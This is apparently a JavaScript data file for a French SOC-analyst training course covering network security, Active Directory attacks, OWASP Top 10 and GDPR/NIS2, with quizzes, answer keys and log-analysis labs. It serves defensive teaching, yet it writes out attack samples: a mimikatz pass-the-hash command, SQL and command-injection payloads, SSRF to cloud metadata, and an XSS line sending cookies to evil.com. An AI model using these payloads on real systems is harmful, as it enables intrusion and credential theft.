const niveau1 = {
  id: 1,
  name: 'Sécurité Fondamentale',
  badge: '🔒',
  duration: 80,
  certifications: ['CompTIA Security+'],
  description: 'Sécurité des réseaux, Active Directory, OWASP Top 10, scripting sécurité. Niveau BAC+1/+2.',
  modules: [
    {
      id: 'n1-m1',
      title: 'Sécurité des Réseaux',
      lessons: [
        {
          id: 'n1-m1-l1',
          title: 'Firewalls, IDS/IPS et Architectures de Sécurité',
          description: 'Comprendre le rôle des firewalls, des systèmes de détection et de prévention d\'intrusion et la conception sécurisée des réseaux.',
          duration: 55,
          xpReward: 130,
          hasQuiz: true,
          hasLab: false,
          objectives: [
            'Distinguer les types de firewalls (stateless, stateful, NGFW)',
            'Comprendre IDS vs IPS et leur positionnement',
            'Maîtriser les concepts DMZ, VLAN, segmentation',
            'Comprendre les VPN (SSL, IPSec)',
          ],
          theory: `# Firewalls, IDS/IPS et Architectures de Sécurité

## Les Firewalls

Un firewall est un équipement (matériel ou logiciel) qui **filtre le trafic réseau** selon des règles définies.

### Types de Firewalls

#### 1. Firewall Stateless (filtrage de paquets)
- Analyse chaque paquet **indépendamment**
- Règles basées sur IP source/dest, port, protocole
- Rapide mais limité — ne comprend pas le contexte de la connexion

\`\`\`
Règle exemple :
ALLOW TCP 0.0.0.0/0 → 10.0.0.10 port 443
DENY  ALL
\`\`\`

#### 2. Firewall Stateful (inspection d'état)
- Maintient une **table de sessions** actives
- Comprend les états TCP (SYN, ESTABLISHED, FIN)
- Bloque les paquets qui n'appartiennent pas à une session légitime
- Standard actuel pour firewalls d'entrée de gamme

#### 3. NGFW (Next-Generation Firewall)
- Inspection en profondeur des paquets (**DPI — Deep Packet Inspection**)
- Identification des applications (Layer 7)
- Prévention d'intrusion intégrée (IPS)
- Déchiffrement SSL/TLS
- Exemples : Palo Alto, Fortinet, Check Point

### Règles de Firewall — Bonnes Pratiques

\`\`\`
Principe du moindre privilège :
1. Définir d'abord les règles ALLOW spécifiques
2. Règle finale : DENY ALL (implicite ou explicite)

Ordre des règles : Les règles sont lues de haut en bas,
la PREMIÈRE règle qui correspond est appliquée.

ALLOW TCP 10.0.0.0/24 → 0.0.0.0/0 port 80,443  # Navigation web
ALLOW TCP 10.0.0.0/24 → mailserver port 25,587   # Email
DENY  ALL                                          # Tout le reste
\`\`\`

---

## IDS vs IPS

### IDS — Intrusion Detection System
**Détecte** et **alerte** mais ne bloque pas.
- Mode passif — copie du trafic via port mirror/SPAN
- Génère des alertes pour le SOC
- Aucun impact sur le trafic (pas de faux positifs bloquants)

### IPS — Intrusion Prevention System
**Détecte ET bloque** en temps réel.
- Mode inline — dans le flux de trafic
- Peut bloquer des attaques en cours
- Risque : faux positifs qui bloquent du trafic légitime

### Positionnement

\`\`\`
Internet
   │
[Firewall] ←─ première ligne de défense
   │
[IPS] ←─ inline, bloque les attaques connues
   │
[DMZ] ─── Serveurs publics (web, mail)
   │
[IDS] ←─ passif, surveillance interne
   │
[LAN Interne]
   │
[Serveurs critiques]
\`\`\`

---

## DMZ — Zone Démilitarisée

La DMZ isole les serveurs accessibles depuis Internet du LAN interne.

\`\`\`
Internet → [Firewall Externe] → [DMZ] → [Firewall Interne] → [LAN]
                                  │
                             Serveurs web
                             Serveurs mail
                             VPN concentrators
                             DNS public
\`\`\`

**Règle d'or** : Jamais de connexion directe depuis Internet vers le LAN interne.

---

## VLAN — Virtual Local Area Network

Les VLANs **segmentent logiquement** un réseau physique en plusieurs réseaux isolés.

| VLAN | Contenu | Justification |
|------|---------|---------------|
| VLAN 10 | Serveurs | Isolation des serveurs |
| VLAN 20 | Postes de travail | Users standard |
| VLAN 30 | Administration | IT/Admins |
| VLAN 40 | IoT | Isolation des objets connectés |
| VLAN 50 | Invités | Pas d'accès au LAN |

**En SOC** : Un malware qui se propage ne peut pas traverser les VLANs sans passer par le firewall.

---

## VPN — Virtual Private Network

### VPN SSL/TLS
- Accès via navigateur ou client léger
- Protocoles : HTTPS (port 443)
- Utilisé pour l'accès distant des employés

### VPN IPSec
- Protocole au niveau IP (couche 3)
- Utilisé pour les liaisons site-à-site
- Plus complexe à configurer

### En SOC : Signaux d'alerte VPN
- Connexion VPN depuis un pays inhabituel
- Connexion VPN à des heures anormales
- Volume de données anormalement élevé après connexion VPN
- Multiples connexions simultanées avec le même compte`,
          quiz: [
            {
              id: 'n1-m1-l1-q1',
              xpReward: 60,
              question: 'Quelle est la différence principale entre un IDS et un IPS ?',
              options: [
                'L\'IDS est plus récent que l\'IPS',
                'L\'IDS détecte et alerte, l\'IPS détecte et bloque activement',
                'L\'IPS analyse la couche 7, l\'IDS seulement la couche 4',
                'L\'IDS est placé inline, l\'IPS en passif',
              ],
              correct: 1,
              explanation: '**IDS (Intrusion Detection System)** détecte et génère des alertes, mais ne bloque pas (passif). **IPS (Intrusion Prevention System)** détecte ET bloque en temps réel (inline). L\'IPS a un impact direct sur le trafic.',
            },
            {
              id: 'n1-m1-l1-q2',
              xpReward: 60,
              question: 'Quel est le rôle d\'une DMZ dans une architecture réseau ?',
              options: [
                'Remplacer le firewall pour les serveurs web',
                'Isoler les serveurs accessibles depuis Internet du LAN interne',
                'Chiffrer le trafic réseau entre serveurs',
                'Répartir la charge entre plusieurs serveurs',
              ],
              correct: 1,
              explanation: 'La **DMZ (Zone Démilitarisée)** isole les serveurs accessibles depuis Internet (web, mail, DNS) du réseau interne. Si un serveur DMZ est compromis, l\'attaquant ne peut pas directement accéder au LAN interne.',
            },
            {
              id: 'n1-m1-l1-q3',
              xpReward: 60,
              question: 'Pourquoi les VLANs améliorent-ils la sécurité d\'un réseau ?',
              options: [
                'Ils chiffrent le trafic entre machines',
                'Ils accélèrent la connexion Internet',
                'Ils isolent les segments réseau, limitant la propagation latérale des malwares',
                'Ils remplacent les firewalls pour les grandes entreprises',
              ],
              correct: 2,
              explanation: 'Les **VLANs** créent des segments réseau logiquement isolés. Un malware ne peut pas se propager d\'un VLAN à un autre sans passer par le firewall, limitant la **propagation latérale** lors d\'un incident de sécurité.',
            },
          ],
        },
        {
          id: 'n1-m1-l2',
          title: 'Active Directory — Sécurité et Kerberos',
          description: 'Comprendre la structure d\'Active Directory, l\'authentification Kerberos et les attaques courantes (Pass-the-Hash, Kerberoasting).',
          duration: 65,
          xpReward: 160,
          hasQuiz: true,
          hasLab: true,
          objectives: [
            'Comprendre la structure d\'Active Directory (domaines, OU, GPO)',
            'Maîtriser le protocole Kerberos',
            'Connaître les attaques AD courantes (PtH, PtT, Kerberoasting)',
            'Identifier les indicateurs de compromission AD',
          ],
          theory: `# Active Directory — Sécurité et Kerberos

## Structure d\'Active Directory

Active Directory (AD) est le service d\'annuaire Microsoft qui centralise :
- **Authentification et autorisation** des utilisateurs
- **Gestion des politiques** (GPO)
- **Inventaire** des ressources (ordinateurs, imprimantes)

### Composants clés

\`\`\`
Forêt (Forest)
└── Domaine (Domain) : ENTREPRISE.LOCAL
    ├── Organizational Units (OU)
    │   ├── OU=Utilisateurs
    │   ├── OU=Ordinateurs
    │   └── OU=Serveurs
    ├── Groupes (Groups)
    │   ├── Domain Admins ← Groupe le plus privilégié
    │   ├── Enterprise Admins
    │   └── Schema Admins
    └── Objets (Objects)
        ├── Utilisateurs (User objects)
        ├── Ordinateurs (Computer objects)
        └── Service Accounts
\`\`\`

### Groupes privilégiés — Cibles prioritaires des attaquants

| Groupe | Niveau de risque | Capacités |
|--------|-----------------|-----------|
| Domain Admins | 🔴 MAXIMUM | Contrôle total du domaine |
| Enterprise Admins | 🔴 MAXIMUM | Contrôle de la forêt |
| Schema Admins | 🔴 MAXIMUM | Modifier le schéma AD |
| Backup Operators | 🟠 Élevé | Sauvegarder/restaurer des fichiers |
| Account Operators | 🟠 Élevé | Gérer des comptes |

### Contrôleurs de domaine (DC)

Le **Domain Controller** héberge AD DS (Active Directory Domain Services). C\'est la cible n°1 des attaquants en environnement Windows.

---

## Le Protocole Kerberos

Kerberos est le protocole d\'authentification par défaut dans Windows Active Directory (depuis Windows 2000).

### Fonctionnement (simplifié)

\`\`\`
Client          AS (Authentication Server)    TGS (Ticket Granting Server)    Service
  │                     │                              │                          │
  │──── AS-REQ ────────>│  "Je suis Alice"             │                          │
  │<─── TGT ────────────│  Ticket Granting Ticket       │                          │
  │     (chiffré avec   │                              │                          │
  │      hash Alice)    │                              │                          │
  │                     │                              │                          │
  │──── TGS-REQ ──────────────────────────────────────>│  "Je veux accéder à..."  │
  │<─── Service Ticket ─────────────────────────────────│                          │
  │                                                      │                          │
  │──── AP-REQ ──────────────────────────────────────────────────────────────────>│
  │<─── AP-REP ──────────────────────────────────────────────────────────────────│
\`\`\`

### Éléments clés

- **TGT (Ticket Granting Ticket)** : "Laissez-passer" initial, prouve l\'identité
- **TGS (Ticket Granting Service)** : Émet les tickets de service
- **Service Ticket (ST)** : Accès à un service spécifique
- **krbtgt** : Compte système qui signe tous les tickets

---

## Attaques Active Directory — Les plus courantes en SOC

### 1. Pass-the-Hash (PtH)
L\'attaquant vole le **hash NTLM** d\'un compte et l\'utilise directement pour s\'authentifier **sans connaître le mot de passe**.

\`\`\`
Attaquant extrait : NTLM hash = aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
Utilise le hash pour : sekurlsa::pth /user:Administrator /domain:LAB /ntlm:8846f7...
→ Connexion réussie sans le mot de passe !
\`\`\`

**Détection SOC** :
- EventID 4624 avec Logon_Type=3 et NTLMv1/v2 sans raison valide
- Connexions réseau anormales avec compte admin

### 2. Pass-the-Ticket (PtT)
Vol d\'un **ticket Kerberos** en mémoire pour réutilisation.

**Outil courant** : Mimikatz (\`sekurlsa::tickets\`)

**Détection SOC** :
- Tickets avec durée de vie anormale
- Source du ticket ≠ machine légitime

### 3. Kerberoasting
Demander des Service Tickets pour des comptes de service (SPNs), puis **cracker le hash hors ligne**.

\`\`\`
1. Attaquant demande un ST pour un compte de service
2. Le ST est chiffré avec le hash du compte de service
3. Attaquant le cracke hors ligne avec hashcat/john
4. Obtient le mot de passe du service account
\`\`\`

**Détection SOC** :
- EventID 4769 : Demande de ticket de service avec encryption RC4 (0x17)
- Grand nombre de 4769 depuis un seul compte en peu de temps

### 4. DCSync
Imiter un contrôleur de domaine pour **synchroniser (extraire) les hashes** de tous les comptes AD.

**Prérequis** : Droits "Replicating Directory Changes"
**Détection SOC** : EventID 4662 avec accesses DS-Replication-Get-Changes

### 5. Golden Ticket
Forger un TGT en utilisant le **hash du compte krbtgt**.
- Accès illimité et persistant à tout le domaine
- Valide même si le mot de passe utilisateur change

**Détection SOC** :
- Tickets avec durée de vie > 10h (standard Windows = 10h max)
- Tickets pour des comptes inexistants
- EventID 4769 + 4768 avec anomalies

---

## Indicateurs de Compromission AD

| Indicateur | Event ID | Signification |
|-----------|----------|---------------|
| Connexion hors heures | 4624 | Activité nocturne inhabituelle |
| Ajout groupe admin | 4728/4732 | Escalade de privilèges |
| GPO modifiée | 5136 | Persistance via GPO |
| Réplication AD | 4662 | Possible DCSync |
| Tickets RC4 | 4769 | Possible Kerberoasting |
| Mots de passe changés | 4723/4724 | Prise de contrôle de compte |`,
          quiz: [
            {
              id: 'n1-m1-l2-q1',
              xpReward: 60,
              question: 'Qu\'est-ce qu\'une attaque "Pass-the-Hash" ?',
              options: [
                'Craquer un mot de passe à partir de son hash',
                'Utiliser directement un hash NTLM pour s\'authentifier sans connaître le mot de passe',
                'Transmettre un hash de malware au serveur',
                'Intercepter les hashes sur le réseau avec un sniffer',
              ],
              correct: 1,
              explanation: '**Pass-the-Hash** consiste à voler le hash NTLM d\'un compte et à l\'utiliser directement pour s\'authentifier sur d\'autres systèmes. L\'attaquant n\'a **pas besoin du mot de passe en clair** — le hash suffit pour certains protocoles d\'authentification Windows.',
            },
            {
              id: 'n1-m1-l2-q2',
              xpReward: 60,
              question: 'Quel Event ID Windows signale des demandes suspectes de tickets Kerberos (possible Kerberoasting) ?',
              options: ['4624', '4769', '4688', '1102'],
              correct: 1,
              explanation: '**EventID 4769** ("A Kerberos service ticket was requested") est généré à chaque demande de Service Ticket. Un grand nombre de 4769 depuis un seul compte, surtout avec encryption RC4 (type 0x17), peut indiquer une attaque de **Kerberoasting**.',
            },
            {
              id: 'n1-m1-l2-q3',
              xpReward: 60,
              question: 'Pourquoi le compte "krbtgt" est-il si important en sécurité Active Directory ?',
              options: [
                'C\'est le compte administrateur principal du domaine',
                'Son hash est utilisé pour signer tous les TGT — un Golden Ticket exploit ce compte',
                'Il gère les connexions VPN du domaine',
                'Il contrôle les mises à jour de Windows',
              ],
              correct: 1,
              explanation: 'Le compte **krbtgt** est utilisé par le KDC (Key Distribution Center) pour signer et chiffrer tous les TGT (Ticket Granting Tickets). Si un attaquant obtient son hash, il peut forger des tickets valides pour n\'importe quel utilisateur — c\'est le **Golden Ticket attack**.',
            },
          ],
          lab: {
            id: 'lab-n1-m1-l2',
            title: 'Analyse d\'un incident Active Directory',
            description: 'Des logs suspects ont été identifiés dans votre environnement AD. Analysez-les pour identifier l\'attaque et l\'attaquant.',
            xpReward: 250,
            files: {
              'ad_events.log': `[2026-05-25 03:00:00] EventID=4624 Type=3 Account=jsmith IP=192.168.1.200 Domain=CORP
[2026-05-25 03:00:01] EventID=4624 Type=3 Account=jsmith IP=192.168.1.200 Domain=CORP
[2026-05-25 03:00:05] EventID=4769 Account=jsmith Service=MSSQLSvc/sql01 EncType=RC4(0x17)
[2026-05-25 03:00:05] EventID=4769 Account=jsmith Service=HTTP/web01 EncType=RC4(0x17)
[2026-05-25 03:00:06] EventID=4769 Account=jsmith Service=CIFS/fs01 EncType=RC4(0x17)
[2026-05-25 03:00:07] EventID=4769 Account=jsmith Service=ldap/dc01 EncType=RC4(0x17)
[2026-05-25 03:00:08] EventID=4769 Account=jsmith Service=host/server05 EncType=RC4(0x17)
[2026-05-25 03:05:22] EventID=4728 Group=Domain Admins Member=jsmith Domain=CORP
[2026-05-25 03:06:00] EventID=4662 Access=DS-Replication-Get-Changes Account=jsmith`,
            },
            commands: {},
            questions: [
              {
                id: 'lab-ad1',
                text: 'Quel type d\'attaque Kerberos les EventIDs 4769 avec EncType=RC4 indiquent-ils ?',
                answer: 'kerberoasting',
                answerAlt: ['Kerberoasting', 'kerb roasting'],
                placeholder: 'Nom de l\'attaque',
              },
              {
                id: 'lab-ad2',
                text: 'Quel compte a été ajouté au groupe Domain Admins (escalade de privilèges) ?',
                answer: 'jsmith',
                placeholder: 'Nom du compte',
              },
              {
                id: 'lab-ad3',
                text: 'Quel EventID indique une possible tentative de DCSync à 03:06 ?',
                answer: '4662',
                placeholder: 'EventID',
              },
            ],
            hints: [
              'EventID 4769 avec encryption RC4 (type 0x17) est le signe classique de Kerberoasting.',
              'EventID 4728 indique l\'ajout d\'un membre à un groupe de sécurité global.',
              'EventID 4662 avec l\'attribut DS-Replication-Get-Changes suggère une tentative de DCSync.',
            ],
          },
        },
      ],
    },
    {
      id: 'n1-m2',
      title: 'Sécurité des Applications Web',
      lessons: [
        {
          id: 'n1-m2-l1',
          title: 'OWASP Top 10 — Les vulnérabilités les plus critiques',
          description: 'Comprendre et détecter les 10 vulnérabilités web les plus dangereuses selon l\'OWASP.',
          duration: 70,
          xpReward: 160,
          hasQuiz: true,
          hasLab: true,
          objectives: [
            'Connaître les 10 vulnérabilités OWASP et leur fonctionnement',
            'Identifier des tentatives d\'injection SQL dans les logs',
            'Détecter des attaques XSS',
            'Comprendre l\'impact business de chaque vulnérabilité',
          ],
          theory: `# OWASP Top 10

## Qu\'est-ce que l\'OWASP ?

L\'OWASP (Open Web Application Security Project) publie le "Top 10" des vulnérabilités web les plus critiques. C\'est **la référence mondiale** pour la sécurité des applications web.

---

## OWASP Top 10 (2021)

### A01 — Broken Access Control
**Définition** : Les utilisateurs peuvent accéder à des ressources pour lesquelles ils n\'ont pas les droits.

**Exemples** :
- Changer un ID dans l\'URL : /user/1234/profile → /user/5678/profile
- Accéder à des fonctions d\'admin sans être admin
- Élévation de privilèges horizontal/vertical

**Détection SOC** :
- Requêtes avec IDs qui changent rapidement
- Accès à /admin depuis un compte non-admin
- HTTP 403 suivis d\'accès réussis après modification

---

### A02 — Cryptographic Failures
**Définition** : Mauvaise utilisation de la cryptographie (données sensibles en clair, algorithmes faibles).

**Exemples** :
- Mots de passe stockés en MD5 sans salt
- Données transmises en HTTP (pas HTTPS)
- Clés de chiffrement hard-codées dans le code

---

### A03 — Injection
**Définition** : Des données non validées sont interprétées comme du code.

#### SQL Injection — La plus dangereuse

\`\`\`sql
-- Requête normale
SELECT * FROM users WHERE username='alice' AND password='monmdp'

-- Avec injection : username = ' OR '1'='1
SELECT * FROM users WHERE username='' OR '1'='1' AND password=''
-- Résultat : TOUS les utilisateurs retournés !

-- Injection UNION (extraction de données)
username = ' UNION SELECT username,password FROM admin--
\`\`\`

**Détection dans les logs** :
\`\`\`
GET /login?user=admin' OR '1'='1'-- HTTP/1.1
GET /products?id=1 UNION SELECT null,username,password FROM users--
GET /search?q=<script>alert(XSS)</script>
\`\`\`

#### Command Injection
\`\`\`bash
# Entrée utilisateur non validée dans une commande système
ping_ip = "8.8.8.8; cat /etc/passwd"
# Exécute : ping 8.8.8.8 ; cat /etc/passwd
\`\`\`

---

### A04 — Insecure Design
**Définition** : Failles de conception architecturale, pas de modèle de menace.

---

### A05 — Security Misconfiguration
**Exemples courants** :
- Comptes par défaut non changés (admin/admin)
- Pages d\'erreur qui révèlent des informations techniques
- Ports inutiles ouverts
- HTTP headers de sécurité manquants
- Buckets S3 publics

**Détection SOC** :
- Accès à /phpinfo.php, /.git/, /.env
- User-Agent de scanners (nikto, sqlmap, wfuzz)

---

### A06 — Vulnerable and Outdated Components
**Définition** : Utilisation de bibliothèques ou frameworks avec CVEs connues.

---

### A07 — Identification and Authentication Failures
**Exemples** :
- Pas de limite de tentatives (brute force)
- Mots de passe faibles autorisés
- Sessions non invalidées à la déconnexion
- Tokens prévisibles

---

### A08 — Software and Data Integrity Failures
**Définition** : Code ou data non vérifiés avant utilisation.
- Supply chain attacks
- Mises à jour non signées

---

### A09 — Security Logging and Monitoring Failures
**Définition** : Absence de logs ou alertes insuffisantes.
- C\'est pour ça que vous existez en tant qu\'analyste SOC !

---

### A10 — Server-Side Request Forgery (SSRF)
**Définition** : L\'application fait des requêtes vers des ressources internes à la demande d\'un attaquant.

\`\`\`
# Paramètre URL vulnérable
GET /fetch?url=http://internal-admin-panel/
GET /fetch?url=http://169.254.169.254/metadata/  # AWS metadata
\`\`\`

---

## Cross-Site Scripting (XSS)

Même si pas directement dans le Top 10 2021, le XSS reste très courant.

### Types de XSS

| Type | Persistance | Impact |
|------|-------------|--------|
| **Reflected** | Pas de stockage | Vol de session, phishing |
| **Stored** | Stocké en base | Affecte tous les visiteurs |
| **DOM-based** | Client-side | Manipulation du DOM |

\`\`\`html
<!-- Payload XSS basique -->
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>

<!-- Obfusqué pour contourner les filtres -->
<img src=x onerror="alert('XSS')">
<svg onload=alert(1)>
\`\`\`

**Détection SOC** : \`<script>\`, \`onerror=\`, \`javascript:\` dans les paramètres URL ou POST`,
          quiz: [
            {
              id: 'n1-m2-l1-q1',
              xpReward: 60,
              question: 'Un attaquant entre " \' OR \'1\'=\'1 " dans un champ de connexion. Quelle attaque tente-t-il ?',
              options: ['XSS', 'CSRF', 'SQL Injection', 'Path Traversal'],
              correct: 2,
              explanation: '**SQL Injection** — Le payload \`\' OR \'1\'=\'1\` est la technique d\'injection SQL classique qui modifie la requête SQL pour retourner "vrai" pour tous les utilisateurs, permettant de contourner l\'authentification.',
            },
            {
              id: 'n1-m2-l1-q2',
              xpReward: 60,
              question: 'Quelle vulnérabilité OWASP est exploitée quand un attaquant change l\'ID dans l\'URL pour accéder au compte d\'un autre utilisateur ?',
              options: ['A03 — Injection', 'A01 — Broken Access Control', 'A07 — Authentication Failures', 'A10 — SSRF'],
              correct: 1,
              explanation: '**A01 — Broken Access Control** couvre les cas où un utilisateur peut accéder à des ressources qui ne lui appartiennent pas. Changer l\'ID utilisateur dans l\'URL (IDOR — Insecure Direct Object Reference) est un exemple classique.',
            },
            {
              id: 'n1-m2-l1-q3',
              xpReward: 60,
              question: 'Dans les logs Apache, quelle entrée indique une tentative de SSRF ?',
              options: [
                'GET /login?user=admin\'--',
                'GET /fetch?url=http://169.254.169.254/latest/meta-data/',
                'GET /<script>alert(1)</script>',
                'GET /admin/../../../etc/passwd',
              ],
              correct: 1,
              explanation: '**SSRF (Server-Side Request Forgery)** : L\'URL 169.254.169.254 est l\'adresse des métadonnées AWS/Azure. Un attaquant via SSRF peut accéder aux credentials cloud de l\'instance, ce qui est une vulnérabilité critique.',
            },
          ],
          lab: {
            id: 'lab-n1-m2-l1',
            title: 'Analyse de logs Apache — Détection d\'attaques OWASP',
            description: 'Analysez ces logs de serveur web pour identifier les attaques OWASP Top 10 en cours.',
            xpReward: 250,
            files: {
              'access.log': `192.168.1.100 - - [25/May/2026:10:00:01] "GET /index.php HTTP/1.1" 200 1234
45.33.32.156 - - [25/May/2026:10:00:10] "GET /login.php?user=admin'+OR+'1'='1'--&pass=x HTTP/1.1" 302 0
45.33.32.156 - - [25/May/2026:10:00:11] "GET /admin/dashboard HTTP/1.1" 200 5678
45.33.32.156 - - [25/May/2026:10:00:15] "GET /search?q=<script>document.location='http://evil.com/c='+document.cookie</script> HTTP/1.1" 200 123
10.0.0.50 - - [25/May/2026:10:01:00] "GET /api/user?id=1 HTTP/1.1" 200 456
10.0.0.50 - - [25/May/2026:10:01:01] "GET /api/user?id=2 HTTP/1.1" 200 456
10.0.0.50 - - [25/May/2026:10:01:02] "GET /api/user?id=3 HTTP/1.1" 200 456
10.0.0.50 - - [25/May/2026:10:01:03] "GET /api/user?id=4 HTTP/1.1" 200 456
10.0.0.50 - - [25/May/2026:10:01:04] "GET /api/user?id=5 HTTP/1.1" 200 456
185.100.65.2 - - [25/May/2026:10:02:00] "GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 200 890
185.100.65.2 - - [25/May/2026:10:02:01] "GET /.env HTTP/1.1" 200 234
185.100.65.2 - - [25/May/2026:10:02:02] "GET /.git/config HTTP/1.1" 200 123`,
            },
            commands: {},
            questions: [
              {
                id: 'lab-owasp1',
                text: 'Quelle IP a réussi une injection SQL et s\'est connectée au dashboard admin ?',
                answer: '45.33.32.156',
                placeholder: 'X.X.X.X',
              },
              {
                id: 'lab-owasp2',
                text: 'Quelle vulnérabilité OWASP exploite l\'IP 185.100.65.2 via le paramètre "fetch?url=" ?',
                answer: 'SSRF',
                answerAlt: ['ssrf', 'Server-Side Request Forgery'],
                placeholder: 'Nom de la vulnérabilité',
              },
              {
                id: 'lab-owasp3',
                text: 'L\'IP 10.0.0.50 incrémente l\'ID utilisateur de 1 à 5. Quelle vulnérabilité cela représente-t-il ?',
                answer: 'IDOR',
                answerAlt: ['idor', 'Insecure Direct Object Reference', 'broken access control', 'A01'],
                placeholder: 'Nom de la vulnérabilité',
              },
            ],
            hints: [
              'Cherchez "OR" et "--" dans les paramètres URL pour identifier le SQL Injection.',
              '169.254.169.254 est l\'IP des métadonnées AWS/Azure — accès via SSRF.',
              'L\'incrémentation séquentielle d\'IDs pour accéder à d\'autres ressources = IDOR (Insecure Direct Object Reference).',
            ],
          },
        },
      ],
    },
    {
      id: 'n1-m3',
      title: 'Normes et Réglementations',
      lessons: [
        {
          id: 'n1-m3-l1',
          title: 'ISO 27001, RGPD et NIS2',
          description: 'Comprendre les principales normes et réglementations en cybersécurité qui encadrent le travail du SOC.',
          duration: 45,
          xpReward: 100,
          hasQuiz: true,
          hasLab: false,
          objectives: [
            'Comprendre ISO 27001 et son périmètre',
            'Connaître les obligations RGPD en cas d\'incident',
            'Maîtriser les exigences NIS2',
            'Savoir rédiger une notification d\'incident',
          ],
          theory: `# Normes et Réglementations en Cybersécurité

## ISO 27001 — SMSI

L\'ISO 27001 est la norme internationale pour les **Systèmes de Management de la Sécurité de l\'Information (SMSI)**.

### Principes clés
- Approche par les risques
- Amélioration continue (Plan-Do-Check-Act)
- Documentation et traçabilité

### Domaines de contrôle (Annexe A)
- Politiques de sécurité
- Organisation de la sécurité
- Sécurité des ressources humaines
- Gestion des actifs
- Contrôle d\'accès
- Cryptographie
- Sécurité physique
- Sécurité des opérations
- **Journalisation et surveillance** ← Rôle du SOC
- Gestion des incidents

---

## RGPD — Règlement Général sur la Protection des Données

### Obligations en cas d\'incident de sécurité

| Délai | Action |
|-------|--------|
| **72 heures** | Notifier l\'autorité de contrôle (CNIL en France) si risque pour les personnes |
| **Sans délai** | Notifier les personnes concernées si risque élevé |

### Données à mentionner dans la notification
- Nature de la violation
- Catégories et nombre de personnes concernées
- Catégories et volume de données
- Conséquences probables
- Mesures prises

### Rôle du SOC en RGPD
- Détecter les violations de données
- Documenter tous les incidents (même non notifiés)
- Estimer l\'impact sur les données personnelles

---

## NIS2 — Network and Information Security

La directive **NIS2** (2022) renforce la cybersécurité des entités essentielles en Europe.

### Entités concernées
- Énergie, transport, santé, eau
- Services numériques (cloud, DNS)
- Administrations publiques

### Obligations principales
- Mesures de gestion des risques cyber
- Notification des incidents dans **24h** (préliminaire)
- Notification dans **72h** (complète)
- Signalement final dans **1 mois**

### Sanctions
- Entités essentielles : jusqu\'à **10M€ ou 2% du CA mondial**
- Entités importantes : jusqu\'à **7M€ ou 1,4% du CA mondial**

---

## Cadres de réponse aux incidents

### NIST SP 800-61
- Préparation → Détection → Confinement → Éradication → Récupération → Retour d\'expérience

### ANSSI (France)
- L\'Agence Nationale de la Sécurité des Systèmes d\'Information
- Publie des guides et recommandations
- Peut intervenir en cas d\'incident majeur (OIV)`,
          quiz: [
            {
              id: 'n1-m3-l1-q1',
              xpReward: 50,
              question: 'Selon le RGPD, dans quel délai faut-il notifier la CNIL en cas de violation de données personnelles ?',
              options: ['24 heures', '48 heures', '72 heures', '1 semaine'],
              correct: 2,
              explanation: 'Selon l\'article 33 du RGPD, la notification à l\'autorité de contrôle (CNIL en France) doit se faire dans les **72 heures** suivant la prise de connaissance d\'une violation de données à caractère personnel, sauf si la violation est peu susceptible d\'engendrer un risque.',
            },
            {
              id: 'n1-m3-l1-q2',
              xpReward: 50,
              question: 'Quelle norme ISO définit les exigences pour un Système de Management de la Sécurité de l\'Information (SMSI) ?',
              options: ['ISO 9001', 'ISO 27001', 'ISO 31000', 'ISO 22301'],
              correct: 1,
              explanation: '**ISO 27001** définit les exigences pour établir, mettre en œuvre, maintenir et améliorer en continu un Système de Management de la Sécurité de l\'Information (SMSI). C\'est la norme de certification reconnue mondialement en cybersécurité.',
            },
          ],
        },
      ],
    },
  ],
}

export default niveau1
